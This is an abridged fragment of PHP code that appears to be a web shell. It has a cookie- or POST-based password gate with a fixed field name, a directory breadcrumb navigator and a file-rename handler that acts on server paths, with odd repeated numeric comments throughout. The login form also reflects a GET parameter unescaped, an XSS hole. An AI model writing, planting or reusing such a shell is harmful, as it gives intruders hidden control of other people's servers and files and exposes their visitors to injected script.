...
$pass = false;
if (isset($_COOKIE['pw_name_69878'])) {
    if(($_COOKIE['pw_name_69878']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_69878'])) {
        if(($_POST['pw_name_69878']) == $auth_key) {
            setcookie("pw_name_69878", $_POST['pw_name_69878']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_69878' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1707715415556555 1707715415892811 1707715415595260 1707715415164119
echo <<<HEAD
<!DOCTYPE html>
<html lang="en">
<head>
...
HEAD;// 1707715415556555 1707715415892811 1707715415595260 1707715415164119
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1707715415556555 1707715415892811 1707715415595260 1707715415164119
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1707715415556555 1707715415892811 1707715415595260 1707715415164119
            $name = PATH . "/" . $_GET['r'];
